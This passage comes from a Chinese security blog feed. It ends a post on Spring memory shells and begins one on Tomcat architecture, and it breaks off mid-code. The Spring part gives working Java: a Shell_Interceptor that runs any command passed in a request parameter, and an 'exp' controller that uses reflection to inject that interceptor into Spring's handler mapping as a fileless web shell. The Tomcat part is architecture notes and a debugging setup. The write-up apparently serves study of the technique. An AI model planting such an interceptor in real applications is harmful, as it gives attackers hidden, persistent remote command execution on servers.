(WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>先来看getAttribute</p><h6 id="getAttribute获取"><a href="#getAttribute获取" class="headerlink" title="getAttribute获取"></a>getAttribute获取</h6><p>首先是<code>RequestContextHolder.currentRequestAttributes()</code>可以获取当前的请求和响应组成的一个Attributes</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807223530.png" alt="image.png"><br>可以看见它把RequestFacade和ResponeFacade包装在一起了<br>之后可以跟进getAttribute方法</p><p>可以看见第二个参数是0的话就是从requestFacade中获取, 否则从session中获取<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807223742.png" alt="image.png"></p><p>最终是从Request中的attribute中获取, 这个attribute存储了当前请求的上下文信息还有请求的具体信息<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807224017.png" alt="image.png"><br>其中就包括了<code>AnnotationConfigServletWebServerApplicationContext</code>, 这正是我们要拿到的</p><h5 id="获取requestMappingHandlerMapping"><a href="#获取requestMappingHandlerMapping" class="headerlink" title="获取requestMappingHandlerMapping"></a>获取requestMappingHandlerMapping</h5><p>接下来就是从AnnotationConfigServletWebServerApplicationContext管理的众多bean中获取AbstractHandlerMapping<br>虽说是AbstractHandlerMapping, 具体的类实际上是requestMappingHandlerMapping<br>可以看之前的图:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806163941.png" alt="image.png"></p><p>在beanFactory存储的单例中可以找到:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807225800.png" alt="image.png"><br>我们当然可以反射获取,不过在AnnotationConfigServletWebServerApplicationContext的祖宗类AbstractApplicationContext中实现了getBean方法可以直接获取BeanFactory中的bean<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807230634.png" alt="image.png"></p><h5 id="构造并植入interceptor"><a href="#构造并植入interceptor" class="headerlink" title="构造并植入interceptor"></a>构造并植入interceptor</h5><p>先准备一个简单的恶意拦截器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                Runtime.getRuntime().exec(cmd);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;  </span><br><span class="line">                n.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就是反射获取再add进去<br>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="keyword">package</span> org.example.springdemo.demos.web;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.ContextLoader;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Controller</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicController</span> &#123;  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span>  </span><br><span class="line">    <span class="meta">@ResponseBody</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@RequestParam(name = &quot;name&quot;, defaultValue = &quot;unknown user&quot;)</span> String name)</span> &#123;  </span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context1</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();  </span><br><span class="line">        <span class="keyword">if</span> (context1 != <span class="literal">null</span>) &#123;  </span><br><span class="line">            System.out.println(context1.getClass().getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context4</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);  </span><br><span class="line">         <span class="keyword">if</span> (context4 != <span class="literal">null</span>) &#123;  </span><br><span class="line">            System.out.println(context4.getClass().getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">AbstractHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span> (AbstractHandlerMapping)context4.getBean(RequestMappingHandlerMapping.class);  </span><br><span class="line">         <span class="keyword">if</span> (handlerMapping != <span class="literal">null</span>) &#123;  </span><br><span class="line">            System.out.println(handlerMapping.getClass().getName());  </span><br><span class="line">         &#125;  </span><br><span class="line">  </span><br><span class="line">         <span class="keyword">try</span> &#123;  </span><br><span class="line">             <span class="type">Shell_Interceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Interceptor</span>();  </span><br><span class="line">  </span><br><span class="line">             <span class="type">Class</span> <span class="variable">abstractHandlerMappingClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMapping&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">             <span class="type">Field</span> <span class="variable">adaptedInterceptorsField</span> <span class="operator">=</span> abstractHandlerMappingClazz.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);  </span><br><span class="line">             adaptedInterceptorsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">             List&lt;HandlerInterceptor&gt; adaptedInterceptors = (List&lt;HandlerInterceptor&gt;) adaptedInterceptorsField.get(handlerMapping);  </span><br><span class="line">             adaptedInterceptors.add(interceptor);  </span><br><span class="line">  </span><br><span class="line">         &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">             e.printStackTrace();  </span><br><span class="line">         &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;n4c1&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    Runtime.getRuntime().exec(cmd);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;  </span><br><span class="line">                    n.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807232908.png" alt="image.png"></p><h3 id="Spring-WebFlux-框架"><a href="#Spring-WebFlux-框架" class="headerlink" title="Spring WebFlux 框架"></a>Spring WebFlux 框架</h3><p>[[Spring WebFlux 框架]]</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://juejin.cn/post/7214831216028745783#heading-4">https://juejin.cn/post/7214831216028745783#heading-4</a><br><a href="https://xz.aliyun.com/news/18301">从零掌握java内存马大全（基于LearnJavaMemshellFromZero复现重组）</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat 架构原理 &amp; Tomcat内存马</title>
      <link href="/2025/09/10/Tomcat-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/09/10/Tomcat-%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-架构原理-Tomcat内存马"><a href="#Tomcat-架构原理-Tomcat内存马" class="headerlink" title="Tomcat 架构原理 &amp; Tomcat内存马"></a>Tomcat 架构原理 &amp; Tomcat内存马</h1><p>先阅读<br><a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09"># Tomcat 架构原理解析到架构设计借鉴</a></p><p><strong>Tomcat 设计了两个核心组件连接器（Connector）和容器（Container）。连接器负责对外交流，容器负责内部 处理</strong></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722011346.png" alt="image.png"></p><h3 id="连接器结构"><a href="#连接器结构" class="headerlink" title="连接器结构"></a>连接器结构</h3><p>连接器又分为两部分 &#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;和&#x3D;&#x3D;<code>Adapter</code>&#x3D;&#x3D;<br>其中&#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;负责与&#x3D;&#x3D;socket&#x3D;&#x3D;交互并将数据转换为其转换为&#x3D;&#x3D;<code>Tomcat Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Tomcat Respone</code>&#x3D;&#x3D;<br>由于这并不是标准的Servlet请求或响应, tomcat在设计时使用&#x3D;&#x3D;<code>Adapter</code>&#x3D;&#x3D;来将  &#x3D;&#x3D;<code>Tomcat Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Tomcat Respone</code> &#x3D;&#x3D;转换为标准的&#x3D;&#x3D;<code>Servlet Request</code>&#x3D;&#x3D;或&#x3D;&#x3D;<code>Servlet Respone</code>&#x3D;&#x3D;</p><h4 id="ProtocolHandler"><a href="#ProtocolHandler" class="headerlink" title="ProtocolHandler"></a><code>ProtocolHandler</code></h4><p>&#x3D;&#x3D;<code>ProtocolHandler</code>&#x3D;&#x3D;又包含了&#x3D;&#x3D;<code>EndedPoint</code>&#x3D;&#x3D;和&#x3D;&#x3D;<code>Processor</code>&#x3D;&#x3D;这两部分<br><code>EndPoint</code>是通信端点，即通信监听的接口，是具体的&#x3D;&#x3D;Socket &#x3D;&#x3D;接收和发送处理器，是对传输层的抽象，因此 <code>EndPoint</code>是用来实现 <code>TCP/IP</code> 协议数据读写的，本质调用操作系统的 socket 接口。<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720234251.png" alt="image.png"></p><h5 id="EndPoint"><a href="#EndPoint" class="headerlink" title="EndPoint"></a><code>EndPoint</code></h5><p>&#x3D;&#x3D;<code>EndPoint</code>&#x3D;&#x3D;是通信端点，即&#x3D;&#x3D;通信监听的接口&#x3D;&#x3D;，是具体的 Socket 接收和发送处理器，是对传输层的抽象，因此 <code>EndPoint</code>是用来实现 <code>TCP/IP</code> 协议数据读写的，本质调用操作系统的 socket 接口。<br>其工作流程如下图<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722012456.png" alt="image.png"></p><h5 id="Proccessor"><a href="#Proccessor" class="headerlink" title="Proccessor"></a><code>Proccessor</code></h5><p>Processor 用来实现 HTTP 协议，Processor 接收来自 <code>EndPoint</code>的 <code>Socket</code>，读取字节流解析成 Tomcat <code>Request</code>和 <code>Response</code>对象，并通过 <code>Adapter</code>将其提交到容器处理，<code>Processor</code>是对应用层协议的抽象。</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720234159.png" alt="image.png"></p><h4 id="Adapter"><a href="#Adapter" class="headerlink" title="Adapter"></a>Adapter</h4><p>由于协议的不同，Tomcat 定义了自己的 <code>Request</code> 类来存放请求信息，这里其实体现了面向对象的思维。但是这个 Request 不是标准的 <code>ServletRequest</code> ，所以不能直接使用 Tomcat 定义 Request 作为参数直接容器。</p><p>Tomcat 设计者的解决方案是引入 <code>CoyoteAdapter</code>，这是适配器模式的经典运用，<code>Acceptor</code>监听连接生成 <code>SocketProcessor</code> 调用 <code>CoyoteAdapter</code> 的 <code>Sevice</code> 方法，传入的是 <code>Tomcat Request</code> 对象，<code>CoyoteAdapter</code>负责将 <code>Tomcat Request</code> 转成 <code>ServletRequest</code>，再调用容器的 <code>Service</code>方法</p><h3 id="Servlet容器结构"><a href="#Servlet容器结构" class="headerlink" title="Servlet容器结构"></a>Servlet容器结构</h3><p>具体结构如下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250720162109.png" alt="image.png"></p><p>一个 &#x3D;&#x3D;Service&#x3D;&#x3D; 只能有 一个 &#x3D;&#x3D;<code>Engine</code>&#x3D;&#x3D;, 一个 &#x3D;&#x3D;<code>Engine</code>&#x3D;&#x3D;可以管理多个站点(&#x3D;&#x3D;Host&#x3D;&#x3D;),  一个站点有多个&#x3D;&#x3D;<code>Context</code>&#x3D;&#x3D;(url路径), 一个context下可以有多个&#x3D;&#x3D;<code>servlet</code>&#x3D;&#x3D;, <code>Wrapper</code> 表示一个 <code>Servlet</code><br>为了方便, tomcat使用[[组合模式]]来管理只有一个具有父子关系地树形结构, 具体是: <strong>所有容器组件都实现了 <code>Container</code>接口，因此组合模式可以使得用户对单容器对象和组合容器对象的使用具有一致性</strong>。这里单容器对象指的是最底层的 <code>Wrapper</code>，组合容器对象指的是上面的 <code>Context</code>、<code>Host</code>或者 <code>Engine</code>。<code>Container</code> 接口定义如下：<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722013756.png" alt="image.png"></p><h5 id="Lifecycle-生命周期"><a href="#Lifecycle-生命周期" class="headerlink" title="Lifecycle 生命周期"></a>Lifecycle 生命周期</h5><p><code>Container</code>接口还继承了&#x3D;&#x3D;Lifecycle&#x3D;&#x3D;,Tomcat 就是通过 <code>Lifecycle</code> 统一管理所有容器的组件的&#x3D;&#x3D;生命周期&#x3D;&#x3D;。通过组合模式管理所有容器，拓展 <code>Lifecycle</code> 实现对每个组件的生命周期管理 ，<code>Lifecycle</code> 主要包含的方法&#x3D;&#x3D;<code>init()、start()、stop() 和 destroy()</code>&#x3D;&#x3D;。这样当一个<code>Context</code>, 其下面的wrapper也会被关闭</p><p>此外 因为各个组件<code>init()</code> 和 <code>start()</code> 方法的具体实现是复杂多变的，比如在 Host 容器的启动方法里需要扫描 webapps 目录下的 Web 应用，创建相应的 Context 容器,  如果下次有需要加入新的逻辑, 直接修改<code>init()</code> 和 <code>start()</code> 方法的话就会违背&#x3D;&#x3D;开闭原则&#x3D;&#x3D;, 因此tomcat采用[[观察者模式]]来解决这一问题<br>以下就是 <code>Lyfecycle</code> 接口的定义:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014620.png" alt="image.png"></p><p>此外 Tomcat 定义一个基类 &#x3D;&#x3D;<code>LifeCycleBase</code>&#x3D;&#x3D; 来实现<code> LifeCycle</code> 接口，把一些&#x3D;&#x3D;公共的逻辑&#x3D;&#x3D;放到基类中去，比如&#x3D;&#x3D;生命状态的转变与维护&#x3D;&#x3D;、&#x3D;&#x3D;生命事件的触发以及监听器的添加和删除&#x3D;&#x3D;等，而子类就负责实现自己的&#x3D;&#x3D;初始化&#x3D;&#x3D;、&#x3D;&#x3D;启动和停止等方法&#x3D;&#x3D;。<br>典型的&#x3D;&#x3D;抽象模板设计模式&#x3D;&#x3D;<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014824.png" alt="image.png"></p><p>总体设计图<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722015102.png" alt="image.png"></p><h3 id="Tomcat启动流程"><a href="#Tomcat启动流程" class="headerlink" title="Tomcat启动流程"></a>Tomcat启动流程</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722014956.png" alt="image.png"></p><ul><li>Tomcat 本生就是一个 Java 程序，所以 startup.sh 脚本就是启动一个 JVM 来运行 Tomcat 的启动类 Bootstrap。</li><li>Bootstrap 主要就是实例化 Catalina 和初始化 Tomcat 自定义的类加载器。热加载与热部署就是靠他实现。</li><li>Catalina: 解析 server.xml 创建 Server 组件，并且调用 Server.start() 方法。</li><li>Server：管理 Service 组件，调用 Service 的 start() 方法。</li><li>Service：主要职责就是管理顶层容器 Engine，分别调用 <code>Connector</code> 和 <code>Engine</code> 的 <code>start</code> 方法。</li></ul><h4 id="init流程"><a href="#init流程" class="headerlink" title="init流程"></a>init流程</h4><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722144446.png" alt="image.png"></p><h4 id="start流程"><a href="#start流程" class="headerlink" title="start流程"></a>start流程</h4><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250722144529.png" alt="image.png"></p><h4 id="源码调试"><a href="#源码调试" class="headerlink" title="源码调试"></a>源码调试</h4><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span>  </span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servletMemoryShell<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span>        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.memshell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleException;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.startup.Tomcat;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> LifecycleException &#123;  </span><br><span class="line">        <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();  </span><br><span class="line">        tomcat.getConnector(); <span class="comment">//tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603  </span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> tomcat.addWebapp(<span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;.&quot;</span>).getAbsolutePath());  </span><br><span class="line">        Tomcat.addServlet(context, <span class="string">&quot;helloServlet&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloServlet</span>());  </span><br><span class="line">        context.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;helloServlet&quot;</span>);  </span><br><span class="line">        tomcat.start();  </span><br><span class="line">        tomcat.getServer().await();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HelloServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.memshell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span 